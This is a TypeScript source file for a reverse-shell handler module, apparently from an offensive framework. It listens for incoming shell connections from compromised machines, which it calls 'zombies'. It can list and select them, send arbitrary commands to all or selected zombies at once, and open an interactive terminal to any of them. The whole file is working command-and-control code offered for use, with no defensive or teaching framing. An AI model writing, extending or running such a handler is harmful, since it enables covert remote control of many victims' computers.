import { spawn } from 'child_process';
import net from 'net';
import path from 'path';
import {
    Server,
    Socket,
} from 'socket.io';

import { Module } from '../../classes/Module';
import {
    cmdError,
    cmdWarn,
} from '../../utils/cmd';

export default class ShellServerModule extends Module {
    public description = 'This modules helps handle multiple reverse_shell connections.';
    public selectedIDs: string[] = [];
    public zombies: Record<string, net.Socket> = { };
    public terminals: Record<string, Socket> = { };

    public listenPort = 4242;
    public listenIp = '127.0.0.1';

    // set on setup 
    private tcpServer: net.Server;
    private socketServer: Server;

    public onStartup(){
        this.setupServers();
    }

    public onClose(callback){
        this.closeServers(callback);
    }

    public args = [
        {
            arg: `status`,
            desc: `Display general info.`,
            handler: this.handleStatus
        },
        {
            arg: `list`,
            desc: `List all active zombies.`,
            handler: this.handleList
        },
        {
            arg: `list-selected`,
            desc: `List all selected zombies.`,
            handler: this.handleListSelected
        },
        {
            arg: `clear-selected`,
            desc: `Unselect all selected zombies.`,
            handler: this.handleClearSelected
        },
        {
            arg: `select=`,
            desc: `Add a zombie to selected.`,
            handler: this.handleSelect
        },
        {
            arg: `exec_select=`,
            desc: `Run a command on each selected zombie.`,
            handler: this.handleExecSelected
        },
        {
            arg: `exec=`,
            desc: `Run a command on every zombie.`,
            handler: this.handleExec
        },
        {
            arg: `use=`,
            desc: `Open a reverse shell terminal for the selected zombie.`,
            handler: this.handleUse
        },
        {
            arg: `listen_ip=`,
            desc: `Set the listening ip. Default is 127.0.0.1`,
            handler: this.handleSetListenIp
        },
        {
            arg: `listen_port=`,
            desc: `Set the listening port. Default is 4242`,
            handler: this.handleSetListenPort
        },
    ];

    public getTcpIds() {
        return Object.keys(this.zombies);
    }

    public getSocketIds(){
        return Object.keys(this.terminals);
    }

    public handleSetListenIp(ip){
        if(!net.isIPv4(ip)){
            cmdWarn(`Error, invalid ip given: ${ip}`);
            return;
        }
        this.listenIp = ip;
        this.setupServers();
    }

    public handleSetListenPort(port){
        if(isNaN(Number(port))){
            cmdWarn(`Error, listen_port= expects a number, got ${port}`);
            return;
        }
        this.listenPort = Number(port);
        this.setupServers();
    }

    public handleStatus(){
        console.log(`\nTOTAL ZOMBIES: ${this.getTcpIds().length}`);
        console.log(`SELECTED ZOMBIES: ${this.selectedIDs.length}\n`);
    }

    public handleList(){
        const ids = this.getTcpIds();
        if(ids.length === 0){
            console.log(`\nNO ZOMBIES CONNECTED\n`);
            return;
        }
        ids.map(id => {
            const current = this.zombies[id];
            console.log(`id: [${id}] ip: [${current.remoteAddress}:${current.remotePort}]`);
        })
    }

    public handleListSelected(){
        if(this.selectedIDs.length === 0){
            console.log(`\nNO ZOMBIES CONNECTED\n`);
            return;
        }
        this.selectedIDs.map(id => {
            const current = this.zombies[id];
            console.log(`id: [${id}] ip: [${current.remoteAddress}:${current.remotePort}]`);
        })
    }

    public handleClearSelected(){
        this.selectedIDs = [];
    }

    public handleSelect(id){
        if(!this.zombies[id]) {
            cmdError(`Error, no zombie with id '${id}' found.`);
            return;
        }

        this.selectedIDs.push(id);
    }

    public handleExecSelected(cmd){
        this.selectedIDs.map(id => this.zombies[id].write(cmd));
    }

    public handleExec(cmd){
        this.getTcpIds().map(id => this.zombies[id].write(cmd));
    }

    public handleUse(id){
        if(!this.zombies[id]) {
            cmdError(`Error, no zombie with id '${id}' found.`);
            return;
        }

        // open a new terminal with the reverse shell
        const xterm = spawn('xterm', [
            '-e', `node ${path.join(__dirname, './terminal.js')} ${id}`
        ], { detached: true, stdio: 'ignore'});
        xterm.unref();
    }

    public setupServers(){
        const tcp = () => {
            // create new tcp server
            this.tcpServer = net.createServer(socket => {
                socket.setEncoding('utf-8');
                
                // unique string for each connection
                const socketID = this.generateId();
                
                // handle disconnect
                socket.on('close', () => delete this.zombies[socketID]);

                // save to all connections
                this.zombies[socketID] = socket;
            
            }).listen(this.listenPort, this.listenIp);
        }

        const socketio = () => {
            this.socketServer = new Server().listen(30437);
            this.socketServer.sockets.on('connection', socket => {
                // get the zombie id from the terminal
                const zombieID = socket.handshake.query.id as string;
                
                // when terminal sends input send it to the reverse shell
                socket.on('stdin', data => this.zombies[zombieID].write(data));

                // save it for when you want to close it
                this.terminals[zombieID] = socket;

                // when reverse shell sends data print it to the terminal
                this.zombies[zombieID].on('data', data => {
                    socket.emit('stdout', data.toString('utf-8'))
                });
            });
        }

        this.closeServers(() => { tcp(); socketio(); });
    }
    
    public closeServers(callback: () => void){
        // clear previous values
        this.getTcpIds().map(id => this.zombies[id].destroy());
        this.getSocketIds().map(id => this.terminals[id].emit('terminate'));
        this.zombies = {};
        this.terminals = {};
        this.selectedIDs = [];

        let count = 0;
        const cb = () => ++count == 2 && callback();

        // close previous tcp connection
        if(this.tcpServer) {
            this.tcpServer.unref();
            this.tcpServer.close(cb);
        }
        else { cb() }

        // close previous socket connection
        if(this.socketServer) {
            this.socketServer.close(cb);
        }
        else { cb() }
    }

    public generateId(): string {
        return require("crypto").randomBytes(4).toString('hex')
    }
}